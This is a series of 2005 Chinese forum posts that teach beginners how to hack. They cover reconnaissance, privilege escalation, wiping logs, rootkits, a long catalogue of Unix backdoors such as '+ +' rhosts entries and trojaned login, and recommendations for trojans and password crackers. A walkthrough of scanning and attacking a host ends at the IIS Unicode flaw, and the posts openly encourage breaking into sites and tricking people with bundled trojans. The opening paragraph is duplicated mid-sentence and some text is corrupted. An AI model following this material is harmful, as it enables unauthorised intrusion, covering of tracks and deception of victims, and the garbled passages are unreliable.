除此之外，Unix是Internet上的操作系统。当你在不懂Unix的情况下学习使用Internet时，你没辨法在不懂Unix的情况下成为Internet的黑客。因为这个原故，现在的黑客文化还是很牢固的以Unix为中心。(这并不完全是正确的，而且有些活在旧时代的黑客甚至也不喜欢这种情形，但是Unix和Internet之间的共生共成己经到了牢不可破的地步，即使是Microsoft的大块肌肉也没能在上面留下明显的伤痕。) 因些，把Unix装起来吧! (我自己是喜欢Linux，但是还有其它的东东可用。) 学习它，让它运作起来，让它陪你努力精进。 用他向整个Internet喊话。看程序码，改程序。 

有一天你成为一位高竿的黑客，你回头往后看时会发现，你得到比Microsoft操作系统所能提供的还要好的程序设计工具(包括 C，Lisp和 Perl)。而且得到快乐，并学到比共生共成己经到了牢不可破的地步，即使是Microsoft的大块肌肉也没能在上面留下明显的伤痕。) 因些，把Unix装起来吧! (我自己是喜欢Linux，但是还有其它的东东可用。) 学习它，让它运作起来，让它陪你努力精进。用他向整个Internet喊话。 看程序码，改程序。有一天你成为一位高竿的黑客，你回头往后看时会发现，你得到比Microsoft操作系统所能提供的还要好的程序设计工具(包括 C，Lisp和 Perl)。而且得到快乐，并 
学到比你想像中的还要多的知识。关于学习Unix，在Loginataka有更多的资料。(http://www.ccil.org/~esr/faqs/loginataka。) 
看一下Linux distribution的目录或 Linux CD，并把自己交付给它。 

3、学习使用World Wide Web并学会写 HTML。 
在黑客文化创造出来的东西，大多在他们的活动范围外被使用著，如,在工厂和辨公室或大学被漠漠的使用著。但Web是一个很大的例外，这个黑客眼中的大玩具甚至还被政客们接受，并巧巧的在改变这个世界。因此(还有很多好的理由)，你必须学习Web。并不只是学习使用browser(这太容易了)而己，还要学会写HTML这个Web的标签语言。如果你不知道如何设计程序，写HTML也可以给一些习惯上的帮助。嗯!! 建立home page吧! 不过，有一个home page 并没任何特别之处能让你成为一位黑客。Web上到处都是home page，而且大部份都没什么重点，没什么内容的烂泥 -- 很好看的烂泥巴，但是看起来都一样，差不多。 

4、至少学会以下的其中两种： 
一、网站服务器程序ASP、PHP、CGI、JSP 
我个人认为CGI是最难学的其中一种。 
二、程序语言：C语言、C++、VB、JAVA、PERL、DELPHI、汇编语言 
不过我认为C语言的通用性最好，可以跨平台（操作系统）使用。 
还要试着自己写程序、开发软件等工作。 
三、数据库管理软件：MYSQL、SQL、FOXPRO……等。 
四、几种常用的操作系统：WIN98、WIN2000、WINNT、WINXP、UNIX、LINUX、要是能学到UNIX那是最好不过的了。最最基本的WIN2K、WINNT也要学会吧。 
如果以上的你都会了，那么你已经是个高手了。 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:37am 

黑客初级技术讲解（上） 

网络安全从其本质上来讲就是网络上的信息安全。从广义来说，凡是涉及到网络上信息的保密性、完整性、可用性、真实性和可控性的相关技术和理论都是网络安全的研究领域。确保网络系统的信息安全是网络安全的目标，信息安全包括两个方面：信息的存 储安全和信息的传输安全。信息的存储安全是指信息在静态存放状态下的安全，如是否会被非授权调用等。信息的传输安全是指信息在动态传输过程中安全。为了确保网络信息的传输安全，有以下几个问题： 

　　（１）对网络上信息的监听 
　　（２）对用户身份的仿冒 
　　（３）对网络上信息的篡改 
　　（４）对发出的信息予以否认 
　　（５）对信息进行重发 

　　对于一般的常用入侵方法主要有 

　　1.口令入侵 

　　所谓口令入侵，就是指用一些软件解开已经得到但被人加密的口令文档，不过许多黑客已大量采用一种可以绕开或屏蔽口令保护的程序来完成这项工作。对于那些可以解开或屏蔽口令保护的程序通常被称为“Crack”。由于这些软件的广为流传，使得入侵电脑网络系统有时变得相当简单，一般不需要很深入了解系统的内部结构，是初学者的好方法。 

　　2.特洛伊木马术 

　　说到特洛伊木马，只要知道这个故事的人就不难理解，它最典型的做法可能就是把一个能帮助黑客完成某一特定动作的程序依附在某一合法用户的正常程序中，这时合法用户的程序代码已被该变。一旦用户触发该程序，那么依附在内的黑客指令代码同时被激活，这些代码往往能完成黑客指定的任务。由于这种入侵法需要黑客有很好的编程经验，且要更改代码、要一定的权限，所以较难掌握。但正因为它的复杂性，一般的系统管理员很难发现。 

　　3.监听法 

　　这是一个很实用但风险也很大的黑客入侵方法，但还是有很多入侵系统的黑客采用此类方法，正所谓艺高人胆大。 

　　网络节点或工作站之间的交流是通过信息流的转送得以实现，而当在一个没有集线器的网络中，数据的传输并没有指明特定的方向，这时每一个网络节点或工作站都是一个接口。这就好比某一节点说：“嗨！你们中有谁是我要发信息的工作站。” 

　　此时，所有的系统接口都收到了这个信息，一旦某个工作站说：“嗨！那是我，请把数据传过来。”联接就马上完成。 

　　目前有网络上流传着很多嗅探软件，利用这些软件就可以很简单的监听到数据，甚至就包含口令文件，有的服务在传输文件中直接使用明文传输，这也是非常危险的 
4.E-mail技术 

　　使用email加木马程序这是黑客经常使用的一种手段，而且非常奏效，一般的用户，甚至是网管，对网络安全的意识太过于淡薄，这就给很多黑客以可乘之机。 

　　5.病毒技术 
　　作为一个黑客，如此使用应该是一件可耻的事情，不过大家可以学习，毕竟也是一种攻击的办法，特殊时间，特殊地点完全可以使用。 

　　6.隐藏技术 

　　网络攻击的一般步骤及实例 

　　攻击的准备阶段 

　　首先需要说明的是，入侵者的来源有两种，一种是内部人员利用自己的工作机会和权限来获取不应该获取的权限而进行的攻击。另一种是外部人员入侵，包括远程入侵、网络节点接入入侵等。本节主要讨论远程攻击。 

　　进行网络攻击是一件系统性很强的工作，其主要工作流程是：收集情报，远程攻击，远程登录，取得普通用户的权限，取得超级用户的权限，留下后门，清除日志。主要内容包括目标分析，文档获取，破解密码，日志清除等技术，下面分别介绍。 

　　1.确定攻击的目的 

　　攻击者在进行一次完整的攻击之前首先要确定攻击要达到什么样的目的，即给对方造成什么样的后果。常见的攻击目的有破坏型和入侵型两种。破坏型攻击指的只是破坏攻击目标，使其不能正常工作，而不能随意控制目标的系统的运行。要达到破坏型攻击的目的，主要的手段是拒绝服务攻击（Denial Of Service）。另一类常见的攻击目的是入侵攻击目标，这种攻击是要获得一定的权限来达到控制攻击目标的目的。应该说这种攻击比破坏型攻击更为普遍，威胁性也更大。因为黑客一旦获取攻击目标的管理员权限就可以对此服务器做任意动作，包括破坏性的攻击。此类攻击一般也是利用服务器操作系统、应用软件或者网络协议存在的漏洞进行的。当然还有另一种造成此种攻击的原因就是密码泄露，攻击者靠猜测或者穷举法来得到服务器用户的密码，然后就可以用和真正的管理员一样对服务器进行访问。 

　　2.信息收集 

　　除了确定攻击目的之外，攻击前的最主要工作就是收集尽量多的关于攻击目标的信息。这些信息主要包括目标的操作系统类型及版本，目标提供哪些服务，各服务器程序的类型与版本以及相关的社会信息。 

　　要攻击一台机器，首先要确定它上面正在运行的操作系统是什么，因为对于不同类型的操作系统，其上的系统漏洞有很大区别，所以攻击的方法也完全不同，甚至同一种操作系统的不同版本的系统漏洞也是不一样的。要确定一台服务器的操作系统一般是靠经验，有些服务器的某些服务显示信息会泄露其操作系统。例如当我们通过TELNET连上一台机器时，如果显示 

　　Unix（r）System V Release 4．0 
　　login： 

　　那么根据经验就可以确定这个机器上运行的操作系统为SUN OS 5．5或5．5．l。但这样确定操作系统类型是不准确的，因为有些网站管理员为了迷惑攻击者会故意更改显示信息，造成假象。 
还有一种不是很有效的方法，诸如查询DNS的主机信息（不是很可靠）来看登记域名时的申请机器类型和操作系统类型，或者使用社会工程学的方法来获得，以及利用某些主机开放的SNMP的公共组来查询。 

　　另外一种相对比较准确的方法是利用网络操作系统里的TCP/IP堆栈作为特殊的“指纹”来确定系统的真正身份。因为不同的操作系统在网络底层协议的各种实现细节上略有不同。可以通过远程向目标发送特殊的包，然后通过返回的包来确定操作系统类型。例如通过向目标机发送一个FIN的包（或者是任何没有ACK或SYN标记的包）到目标主机的一个开放的端口然后等待回应。许多系统如windows、 BSDI、 CISCO、 HP／UX和 IRIX会返回一个RESET。通过发送一个SYN包，它含有没有定义的TCP标记的TCP头。那么在Linux系统的回应包就会包含这个没有定义的标记，而在一些别的系统则会在收到SYN+BOGU包之后关闭连接。或是利用寻找初始化序列长度模板与特定的操作系统相匹配的方法。利用它可以对许多系统分类，如较早的Unix系统是64K长度，一些新的Unix系统的长度则是随机增长。还有就是检查返回包里包含的窗口长度，这项技术根据各个操作系统的不同的初始化窗口大小来唯一确定它们。利用这种技术实现的工具很多，比较著名的有NMAP、CHECKOS、QUESO等。 

　　获知目标提供哪些服务及各服务daemon的类型、版本同样非常重要，因为已知的漏洞一般都是对某一服务的。这里说的提供服务就是指通常我们提到的喘口，例如一般TELNET在23端口，FTP在对21端口，WWW在80端口或8080端口，这只是一般情况，网站管理完全可以按自己的意愿修改服务所监听的端口号。在不同服务器上提供同一种服务的软件也可以是不同，我们管这种软件叫做daemon，例如同样是提供FTP服务，可以使用wuftp、proftp，ncftp等许多不同种类的daemon。确定daemon的类型版本也有助于黑客利用系统漏洞攻破网站。 

　　另外需要获得的关于系统的信息就是一些与计算机本身没有关系的社会信息，例如网站所属公司的名称、规模，网络管理员的生活习惯、电话号码等。这些信息看起来与攻击一个网站没有关系，实际上很多黑客都是利用了这类信息攻破网站的。例如有些网站管理员用自己的电话号码做系统密码，如果掌握了该电话号码，就等于掌握了管理员权限进行信息收集可以用手工进行，也可以利用工具来完成，完成信息收集的工具叫做扫描器。用扫描器收集信息的优点是速度快，可以一次对多个目标进行扫描。 

　　攻击的实施阶段 

　　1.获得权限 

　　当收集到足够的信息之后，攻击者就要开始实施攻击行动了。作为破坏性攻击，只需利用工具发动攻击即可。而作为入侵性攻击，往往要利用收集到的信息，找到其系统漏洞，然后利用该漏洞获取一定的权限。有时获得了一般用户的权限就足以达到修改主页等目的了，但作为一次完整的攻击是要获得系统最高权限的，这不仅是为了达到一定的目的，更重要的是证明攻击者的能力，这也符合黑客的追求。 

　　能够被攻击者所利用的漏洞不仅包括系统软件设计上的安全漏洞，也包括由于管理配置不当而造成的漏洞。前不久，因特网上应用最普及的著名www服务器提供商Apache的主页被黑客攻破，其主页面上的 Powered by Apache图样（羽毛状的图画）被改成了Powered by　Microsoft Backoffice的图样，那个攻击者就是利用了管理员对Webserver用数据库的一些不当配置而成功取得最高权限的。 


黑客初级技术讲解（中） 

　　当然大多数攻击成功的范例还是利用了系统软件本身的漏洞。造成软件漏洞的主要原因在于编制该软件的程序员缺乏安全意识。当攻击者对软件进行非正常的调用请求时造成缓冲区溢出或者对文件的非法访问。其中利用缓冲区溢出进行的攻击最为普遍，据统计80％以上成功的攻击都是利用了缓冲区溢出漏洞来获得非法权限的。关于缓冲区溢出在后面用专门章节来作详细解释。 

　　无论作为一个黑客还是一个网络管理员，都需要掌握尽量多的系统漏洞。黑客需要用它来完成攻击，而管理员需要根据不同的漏洞来进行不同的防御措施。了解最新最多的漏洞信息，可以到诸如Rootshell（www.rootshell．com）、Packetstorm（packetstorm．securify．com）、Securityfocus（www.securityfocus．com）等网站去查找。 

　　2.权限的扩大 

　　系统漏洞分为远程漏洞和本地漏洞两种，远程漏洞是指黑客可以在别的机器上直接利用该漏洞进行攻击并获取一定的权限。这种漏洞的威胁性相当大，黑客的攻击一般都是从远程漏洞开始的。但是利用远程漏洞获取的不一定是最高权限，而往往只是一个普通用户的权限，这样常常没有办法做黑客们想要做的事。这时就需要配合本地漏洞来把获得的权限进行扩大，常常是扩大至系统的管理员权限。 
只有获得了最高的管理员权限之后，才可以做诸如网络监听、打扫痕迹之类的事情。要完成权限的扩大，不但可以利用已获得的权限在系统上执行利用本地漏洞的程序，还可以放一些木马之类的欺骗程序来套取管理员密码，这种木马是放在本地套取最高权限用的，而不能进行远程控制。例如一个黑客已经在一台机器上获得了一个普通用户的账号和登录权限，那么他就可以在这台机器上放置一个假的su程序。一旦黑客放置了假su程序，当真正的合法用户登录时，运行了su，并输入了密码，这时root密码就会被记录下来，下次黑客再登录时就可以使用su变成root了。 

　　攻击的善后工作 

　　1.日志系统简介 

　　如果攻击者完成攻击后就立刻离开系统而不做任何善后工作，那么他的行踪将很快被系统管理员发现，因为所有的网络操作系统一般都提供日志记录功能，会把系统上发生的动作记录下来。所以，为了自身的隐蔽性，黑客一般都会抹掉自己在日志中留下的痕迹。想要了解黑客抹掉痕迹的方法，首先要了解常见的操作系统的日志结构以及工作方式。Unix的日志文件通常放在下面这几个位置，根据操作系统的不同略有变化 

　　／usr／adm――早期版本的Unix。 
　　／Var／adm新一点的版本使用这个位置。 
　　／Varflort一些版本的Solaris、 Linux BSD、 Free BSD使用这个位置。 
　　／etc，大多数Unix版本把Utmp放在此处，一些Unix版本也把Wtmp放在这里，这也是Syslog．conf的位置。 

　　下面的文件可能会根据你所在的目录不同而不同： 

　　acct或pacct－一记录每个用户使用的命令记录。 
　　accesslog主要用来服务器运行了NCSA HTTP服务器，这个记录文件会记录有什么站点连接过你的服务器。 
　　aculo保存拨出去的Modems记录。 
　　lastlog记录了最近的Login记录和每个用户的最初目的地，有时是最后不成功Login的记录。 
　　loginlog一记录一些不正常的L0gin记录。 
　　messages――记录输出到系统控制台的记录，另外的信息由Syslog来生成 
　　security记录一些使用 UUCP系统企图进入限制范围的事例。 
　　sulog记录使用su命令的记录。 
　　utmp记录当前登录到系统中的所有用户，这个文件伴随着用户进入和离开系统而不断变化。 
　　Utmpx，utmp的扩展。 
　　wtmp记录用户登录和退出事件。 
　　Syslog最重要的日志文件，使用syslogd守护程序来获得。 

　　2.隐藏踪迹 

　　攻击者在获得系统最高管理员权限之后就可以随意修改系统上的文件了（只对常规 Unix系统而言），包括日志文件，所以一般黑客想要隐藏自己的踪迹的话，就会对日志进行修改。最简单的方法当然就是删除日志文件了，但这样做虽然避免了系统管理员根据IP追踪到自己，但也明确无误地告诉了管理员，系统己经被人侵了。所以最常用的办法是只对日志文件中有关自己的那一部分做修改。关于修改方法的具体细节根据不同的操作系统有所区别，网络上有许多此类功能的程序，例如 zap、 wipe等，其主要做法就是清除 utmp、wtmp、Lastlog和 Pacct等日志文件中某一用户的信息，使得当使用w、who、last等命令查看日志文件时，隐藏掉此用户的信息。 
管理员想要避免日志系统被黑客修改，应该采取一定的措施，例如用打印机实时记录网络日志信息。但这样做也有弊端，黑客一旦了解到你的做法就会不停地向日志里写入无用的信息，使得打印机不停地打印日志，直到所有的纸用光为止。所以比较好的避免日志被修改的办法是把所有日志文件发送到一台比较安全的主机上，即使用loghost。即使是这样也不能完全避免日志被修改的可能性，因为黑客既然能攻入这台主机，也很可能攻入loghost。 

　　只修改日志是不够的，因为百密必有一漏，即使自认为修改了所有的日志，仍然会留下一些蛛丝马迹的。例如安装了某些后门程序，运行后也可能被管理员发现。所以，黑客高手可以通过替换一些系统程序的方法来进一步隐藏踪迹。这种用来替换正常系统程序的黑客程序叫做rootkit，这类程序在一些黑客网站可以找到，比较常见的有LinuxRootKit，现在已经发展到了5.0版本了。它可以替换系统的ls、ps、netstat、inetd等等一系列重要的系统程序，当替换了ls后，就可以隐藏指定的文件，使得管理员在使用ls命令时无法看到这些文件，从而达到隐藏自己的目的。 

　　3.后门 

　　 一般黑客都会在攻入系统后不只一次地进入该系统。为了下次再进入系统时方便一点，黑客会留下一个后门，特洛伊木马就是后门的最好范例。Unix中留后门的方法有很多种，下面介绍几种常见的后门，供网络管理员参考防范。 

　　<1>密码破解后门 
　　这是入侵者使用的最早也是最老的方法，它不仅可以获得对Unix机器的访问，而且可 以通过破解密码制造后门。这就是破解口令薄弱的帐号。以后即使管理员封了入侵者的当前帐号，这些新的帐号仍然可能是重新侵入的后门。多数情况下，入侵者寻找口令薄弱的未使用帐号，然后将口令改的难些。当管理员寻找口令薄弱的帐号是，也不会发现这些密码已修改的帐号。因而管理员很难确定查封哪个帐号。 

　　<2>Rhosts + + 后门 
　　在连网的Unix机器中，象Rsh和Rlogin这样的服务是基于rhosts文件里的主机名使用简 单的认证方法。用户可以轻易的改变设置而不需口令就能进入。 入侵者只要向可以访问的某用户的rhosts文件中输入"+ +"，就可以允许任何人从任何地方无须口令便能进 入这个帐号。特别当home目录通过NFS向外共享时，入侵者更热中于此。这些帐号也成 了入侵者再次侵入的后门。许多人更喜欢使用Rsh，因为它通常缺少日志能力. 许多管理员经常检查 "+ +"，所以入侵者实际上多设置来自网上的另一个帐号的主机名和 用户名，从而不易被发现。 

　　<3>校验和及时间戳后门 
　　早期，许多入侵者用自己的trojan程序替代二进制文件。系统管理员便依靠时间戳和系 统校验和的程序辨别一个二进制文件是否已被改变，如Unix里的sum程序。入侵者又发展了使trojan文件和原文件时间戳同步的新技术。它是这样实现的: 先将系统时钟拨 回到原文件时间，然后调整trojan文件的时间为系统时间。一旦二进制trojan文件与 原来的精确同步，就可以把系统时间设回当前时间。Sum程序是基于CRC校验，很容易 骗过。入侵者设计出了可以将trojan的校验和调整到原文件的校验和的程序。MD5是被 大多数人推荐的，MD5使用的算法目前还没人能骗过。 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:37am 

黑客初级技术讲解（下） 


　　<4>Login后门 
　　在Unix里，login程序通常用来对telnet来的用户进行口令验证. 入侵者获取login.c的 原代码并修改，使它在比较输入口令与存储口令时先检查后门口令。如果用户敲入后门 口令，它将忽视管理员设置的口令让你长驱直入。这将允许入侵者进入任何帐号，甚至 是root。由于后门口令是在用户真实登录并被日志记录到utmp和wtmp前产生一个访问 的，所以入侵者可以登录获取shell却不会暴露该帐号。管理员注意到这种后门后，便 用"strings"命令搜索login程序以寻找文本信息. 许多情况下后门口令会原形毕露。入侵者就开始加密或者更好的隐藏口令，使strings命令失效<5>Telnetd后门 
　　当用户telnet到系统，监听端口的inetd服务接受连接随后递给in.telnetd，由它运行 login.一些入侵者知道管理员会检查login是否被修改，就着手修改in.telnetd. 在in.telnetd内部有一些对用户信息的检验，比如用户使用了何种终端. 典型的终端 设置是Xterm或者VT100.入侵者可以做这样的后门，当终端设置为"letmein"时产生一 个不要任何验证的shell. 入侵者已对某些服务作了后门，对来自特定源端口的连接产 生一个shell。 

　　<6>服务后门 
　　几乎所有网络服务曾被入侵者作过后门. Finger，rsh，rexec，rlogin，ftp，甚至 inetd等等的作了的版本随处多是。有的只是连接到某个TCP端口的shell，通过后门口令就能获取访问。这些程序有时用刺娲□？Ucp这样不用的服务，或者被加入inetd.conf 作为一个新的服务，管理员应该非常注意那些服务正在运行，并用MD5对原服务程序做校验。 

　　<7>Cronjob后门 
　　Unix上的Cronjob可以按时间表调度特定程序的运行。入侵者可以加入后门shell程序 使它在1AM到2AM之间运行，那么每晚有一个小时可以获得访问。也可以查看cronjob中 经常运行的合法程序，同时置入后门。 

　　<8>库后门 
　　几乎所有的UNIX系统使用共享库，共享库用于相同函数的重用而减少代码长度。一些入侵者在象crypt.c和_crypt.c这些函数里作了后门；象login.c这样的程序调用了 crypt()。当使用后门口令时产生一个shell。 因此，即使管理员用MD5检查login程序，仍然能产生一个后门函数，而且许多管理员并不会检查库是否被做了后门。对于许多入侵者来说有一个问题: 一些管理员对所有东西多作了MD5校验，有一种办法是入侵者对open()和文件访问函数做后门。后门函数读原文件但执行trojan后门程序。所以 当MD5读这些文件时，校验和一切正常，但当系统运行时将执行trojan版本的，即使trojan库本身也可躲过MD5校验，对于管理员来说有一种方法可以找到后门，就是静态编连MD5校验程序然后运行，静态连接程序不会使用trojan共享库。 

　　<9>内核后门 
　　内核是Unix工作的核心，用于库躲过MD5校验的方法同样适用于内核级别，甚至连静态 连接多不能识别. 一个后门作的很好的内核是最难被管理员查找的，所幸的是内核的 后门程序还不是随手可得，每人知道它事实上传播有多广。 

　<10>文件系统后门 
　　入侵者需要在服务器上存储他们的掠夺品或数据，并不能被管理员发现，入侵者的文章常是包括exploit脚本工具，后门集，sniffer日志，email的备分，原代码，等等！有时为了防止管理员发现这么大的文件，入侵者需要修补"ls"，"du"，"fsck"以隐匿特定的目录和文件，在很低的级别，入侵者做这样的漏洞: 以专有的格式在硬盘上割出一部分，且表示为坏的扇区。因此入侵者只能用特别的工具访问这些隐藏的文件，对于普通的管理员来说，很难发现这些"坏扇区"里的文件系统，而它又确实存在。 

　　<11>Boot块后门 
　　在PC世界里，许多病毒藏匿与根区，而杀病毒软件就是检查根区是否被改变。Unix下，多数管理员没有检查根区的软件，所以一些入侵者将一些后门留在根区。 
. 所以更多的管理员是 用MD5校验和检测这种后门的。 
<12>隐匿进程后门 
　　入侵者通常想隐匿他们运行的程序，这样的程序一般是口令破解程序和监听程序 (sniffer)，有许多办法可以实现，这里是较通用的: 编写程序时修改自己的argv[] 使它看起来象其他进程名。可以将sniffer程序改名类似in.syslog再执行，因此 当管理员用"ps"检查运行进程时，出现 的是标准服务名。可以修改库函数致使 "ps"不能显示所有进程，可以将一个后门或程序嵌入中断驱动程序使它不会在进程表显现。使用这个技术的一个后门例子是 

　　amod.tar.gz : 
　　http://star.niimm.spb.su/~maillist/bugtraq.1/0777.html网络通行. 这些网络通行后 门有时允许入侵者通过防火墙进行访问。有许多网络后门程序允许入侵者建立某个端 口号并不用通过普通服务就能实现访问. 因为这是通过非标准网络端口的通行，管理 员可能忽视入侵者的足迹. 这种后门通常使用TCP，UDP和ICMP，但也可能是其他类型报文。 

　　<14>TCP Shell 后门 
　　入侵者可能在防火墙没有阻塞的高位TCP端口建立这些TCP Shell后门. 许多情况下，他 们用口令进行保护以免管理员连接上后立即看到是shell访问. 管理员可以用netstat 命令查看当前的连接状态，那些端口在侦听，目前连接的来龙去脉. 通常这些后门可 以让入侵者躲过TCP Wrapper技术. 这些后门可以放在SMTP端口，许多防火墙允许 e-mail通行的. 

　　<15>UDP Shell 后门 
　　管理员经常注意TCP连接并观察其怪异情况，而UDP Shell后门没有这样的连接，所以 netstat不能显示入侵者的访问痕迹，许多防火墙设置成允许类似DNS的UDP报文的通行，通常入侵者将UDP Shell放置在这个端口，允许穿越防火墙。 

　　<16>ICMP Shell 后门 
　　Ping是通过发送和接受ICMP包检测机器活动状态的通用办法之一。许多防火墙允许外界ping它内部的机器，入侵者可以放数据入Ping的ICMP包，在ping的机器间形成一个shell通道，管理员也许会注意到Ping包暴风，但除了他查看包内数据，否者入侵者不会暴露。 

　　<17>加密连接 
　　管理员可能建立一个sniffer试图某个访问的数据，但当入侵者给网络通行后门加密 后，就不可能被判定两台机器间的传输内容了。 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:38am 

基础知识（1） 


我认为这是一套适合初学者由浅到深的文章，所以强烈推荐给大家，作者从基础讲到最近比较火的漏洞，可能有些人看来是浅了些，但是的确很适合想干点啥但又不知道怎么办的菜鸟们 。 

第一节，伸展运动。这节操我们要准备道具，俗话说：“工欲善其事，必先利其器”（是这样吗？哎！文化低……）说得有道理，我们要学习黑客技术，一点必要的工具必不可少。 

1，一台属于自己的可以上网的电脑。这样你可以有充分的支配权，上网不用说，否则你怎么看到我的文章？wap?呵呵！属于自己很重要，否则安全性是个很大的问题。第一点相信大家没有问题。 

2，windows2000/nt,别和我说98/me,他们是你们同学用来玩游戏的！（当然，我也是铁杆game fan)对网络支持极差，命令受限制，很多软件又不能用，对黑客来说使用起来绊手绊脚，非常不利。这里我推荐2000，这是一个很成熟的系统（漏洞还是有一堆）。推荐双系统，这样黑玩搭配，干活不累。 

3，冰河。中国第一木马，中者数不胜数，国人骄傲。虽然用冰河根本不能算黑客，但它确实能培养你对黑客的兴趣，同时帮助你了解网络，相信很多黑客同学都是这样起步的。静止写的那篇冰河教程很不错，大家仔细看看。而且，以后你学会入侵服务器后，用冰河操作也会减少工作量（我是懒虫，爽！） 

4，oicq。我们学黑客，可不是学泡mm!bfctx你………… 息怒息怒！我们当然是学黑客，但不要忘了，众人拾柴火更高，我们通过cshu的成员列表，互相联系帮助，对提高水平很有帮助！另外我要废话一句：据我了解，现在黑客网站下载最多的都是针对oicq的破解工具，我个人认为很无聊，偷个密码代表什么，浪费时间！最后补充：mm不能不泡。（谁砸我？？！！） 

5，superscan。很好用的端口扫描器，速度超快，功能一流，一旦拥有，别无所求……（打住！）不论是找木马受害者，还是扫服务器端口，它都非常有效，cshu强烈推荐！ 

6，一本笔记本/便条，网上资料相当多，黑客处理的也是非常之多。良好的习惯决定了你的效率，准备一本笔记本，记录下你的成果，肉鸡，木马利用，命令，密码……坚持一下，你会发现你的效率大幅上升的！ 

7，lc3.著名nt/2000sam破解程序，有时我们拿不到足够权限，又没好办法，那么lc3是最好的解决办法，只要你拿的到sam，你就是服务器它爷爷！本站有其破解程序，支持了暴力破解！ 

8，程序合并。这是玩木马必需的，虽然木马是很低的手段，但有时配合巧办法（以后我会介绍）确实能够达到意想不到的效果，朋友们可以在空闲时玩玩木马，很有趣，若你能巧妙的骗过mm,那么webmaster也可能被你骗倒：〉 （比较理想化） 

9，流光4for 2000/nt。可能是世界上最好的综合类黑软！中国的骄傲，它集成了很全的漏洞信息，速度快，方法多，对有漏洞的主机是毁灭性的打击，操作又方便，是快速黑站必不可少的精品工具。超级吐血推荐！！ 

10，良好的心态，稳定的情绪，刻苦钻研的精神，刨根问底的作风，打扫房间的习惯。黑客是门很高深的学问，不要幻想一步登天，失败是常有的事，千万不可灰心。在那么多黑软的包围下，切不可完全依赖他们，一定要了解它们利用什么原理工作。对任何一个小问题，小细节，一定要问清楚，cshu就是给大家互相交流的场所哦！黑完后不要得意忘形，打扫战场也很重要，以防万一。 

第一节操完，可能很无聊，我就这点水平，大家见谅！这里我说一句大话：做完菜鸟操，包你会黑简单的站（哎哟！心慌了！） 

下一节操我们要介绍如何掌握一台主机的基本信息，期待中…… 

真是太对不起大家了，隔了那么久才写这篇教程，我这几天实在太忙，大家还是体谅一下我吧，好了，开始做操。 

今天的内容是获得主机的信息。 我们要黑一台主机，首先要了解它的信息，包括它的类型，用户列表，目录，端口，漏洞等等。 

首先我们我们要找一台主机来练手，随便挑吧！www.flyingfish.com(乱说的) 

第一部，呵呵，先在ie里看看吧，mmmm.....做的还行，挺精致的！主要是我们肯定了它现在是正常的。 然后，我们应该知道它的ip,很简单，ping它一下就可以了。 

ping www.flyingfish.com，看看窗口里有了什么？是不是有三行回应，其中的111.111.222.222就是ip了（还是胡说的，一个例子）。有人是不是要问，我这里怎么没有。那可能是两个原因，第一，你打错命令了；第二，该主机装了防火墙，禁止ping,不过这种可能很小。 

知道了ip，下一步应该确定端口了。下面是一些常用的端口的默认值 

21--ftp 重要哦 

23--telnet 欢呼吧 

25-smtp 尽管重要，但似乎没什么可利用的 

53--domain 同上 

79--finger 可知道用户信息了 

80--http 要看网页，没它不行吧 

110--pop 收信的 

139--netbios 共享用的，很有利用价值哦 

3389--win2000超级终端 呵呵，这个好！ 

其实端口有上千种，这些最最常用 

我们怎么知道服务器有什么端口打开呢？？去找个扫描器吧，x-scan ,super scan,flux等等很多哦。这里我推荐super scan ，速度很快，本站也有其教程哦！用法还是比较傻瓜的，估计大家不会有问题，轻轻几点，打开的端口就出现了。不错不错，上面说到的都有（太理想化了吧!） 

那么我们该如何应对呢？ 

ps:忘了说一声，顺便扫一下7626,冰河有也说不准哦：） 

若有ftp,那就用用匿名登陆。自己动手也行，最好用x-scan flux等吧！反正，有ftp就有一份希望 

telnet在！好!telnet 111.111.222.222，出现窗口了吧！嗯？要密码？看来网管还不是超级注意文明用语：）随便猜个，错了，闪人！ 

smtp,看着它，无奈 

domain，一般它带了局域网了 

finger 可以知道用户列表了，不好，忘了用法了，幸好finger很少出现 

80肯定在，我们等会来对付它 

110 有smtp，pop在也不奇怪了 

139 找个扫描器来找找有没有露在外面的共享吧，日后也用得着 

3389 太太太好了！！打开客户端吧，用输入法漏洞试试，成了就干了它！不成也没事，我们以后完全控制它3389会很方便的。 

端口扫完了！我们在多了解它一点吧！追捕大家都知道吧，其实用它获取主机信息也不赖哦。打开追捕，输入ip,选择智能追捕，是不是有很多信息出来了？虽然不能直接利用，但毕竟我们有对它有了进一步的了解。 

掌握了那么多信息，我们该做点什么了，一般黑客入侵都是靠着系统漏洞，不会都傻傻地去暴力破解的。我们现在就要看看它有什么漏洞。 

对漏洞大家可能不太了解，我这里也不能一一说明了，太多了，感兴趣的话去论坛找freedom吧！ 

目前广泛利用和存在的漏洞有：unicode,unicode后续，iis溢出，.idq,.frontpage extend,输入法漏洞等等大漏洞。 至于如何确定，呵呵，绝对不会是一行一行地在ie中试吧，拿出x-scan吧，很好的扫描器哦！ 

稍微设置一下就上路吧！过了一会，呵呵，报告出来了，快看，哇！漏洞一大堆！这下赚了！各条漏洞都有详细的信息，大家看吧，总比我说的准了。 

现在这台主机已经和我们成为亲戚了，要让这位亲爱的亲戚做点事，就要开始各种攻击了，下回我们就探讨一下最最可爱的unicode漏洞，各位可能就会在unicode中完成第一次黑客体验，再见：） 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:38am 

基础知识（2） 


今天我们谈谈unicode漏洞，这可是基础中的基础，重点里的重点，不懂的一定要好好学。 

2000年10月17日中联绿盟发布了以下的安全公告： 

微软IIS 4.0 / 5.0 扩展UNICODE目录遍历漏洞 

远程漏洞：是 

本地漏洞：是 

发布日期：2000年10月17日 

更新日期：2000年10月17日 

受影响的版本： 

Microsoft IIS 5.0 + Microsoft Windows NT 2000 Microsoft IIS 4.0 + Microsoft Windows NT 4.0 + Microsoft BackOffice 4.5 - Microsoft Windows NT 4.0 + Microsoft BackOffice 4.0 - Microsoft Windows NT 4.0 

这可是中国乃至全球网络安全界的一次大变节，入侵nt/2000系统变得如此简单，不打补丁的死路一条。 

下面开始正式学习： 

一，UNICODE漏洞的原理 

此漏洞从中文IIS4.0+SP6开始，还影响中文WIN2000+IIS5.0、中文WIN2000+IIS5.0+SP1， 中国台湾繁体中文也同样存在这样的漏洞。 

中文版的WIN2000中，UNICODE编码 存在BUG，在UNICODE 编码中 

